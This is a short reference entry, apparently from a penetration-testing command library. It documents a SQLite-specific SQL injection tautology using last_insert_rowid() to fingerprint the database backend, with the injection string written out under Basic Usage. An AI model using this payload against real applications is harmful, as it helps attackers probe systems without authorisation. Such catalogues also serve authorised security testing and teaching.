---
type: command
executor: sql
data: last_insert_rowid()=last_insert_rowid()
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Database
tags:
  - sql-injection
  - fingerprinting
verified: true
validated: true
---

# sqlite-last-insert-rowid-equality-test

## Command

```sql
last_insert_rowid()=last_insert_rowid()
```

## Description

Tautology using SQLite's last_insert_rowid().

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | Fixed | N/A |

## Examples

### Basic Usage

`' AND last_insert_rowid()=last_insert_rowid() --`

## Expected Output

True if SQLite.

## Related

- [[procedures/DBMS-Fingerprinting-via-SQL-Injection]]
- [[commands/sqlite-last-insert-rowid-greater-test]]
